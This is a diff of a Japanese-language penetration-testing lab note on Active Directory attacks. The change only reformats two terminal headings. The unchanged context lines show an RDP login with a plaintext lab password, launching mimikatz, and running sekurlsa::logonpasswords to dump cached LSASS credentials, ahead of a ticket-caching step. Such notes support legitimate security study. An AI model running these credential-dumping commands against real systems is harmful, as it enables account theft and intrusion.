@@ -376,7 +376,9 @@ xfreerdp3 /cert:ignore /u:jeff /d:corp.com /p:HenchmanPutridBonbon11 /v:192.168.
 
 ### mimikatzの準備
 管理者としてpowershellを起動
-#Terminal01
+
+Terminal01
+
 ```powershell
 cd C:\Tools
 .\mimikatz.exe
@@ -390,7 +392,9 @@ sekurlsa::logonpasswords
 キャッシュされたハッシュを含む、ドメイン ユーザーjeffおよびdaveの LSASS に保存されているすべての資格情報が表示されます。
 
 ## キャッシュされたサービスチケットの取得
-#Terminal02 
+
+Terminal02 
+
 ### チケットのキャッシュ
 
 ```powershell
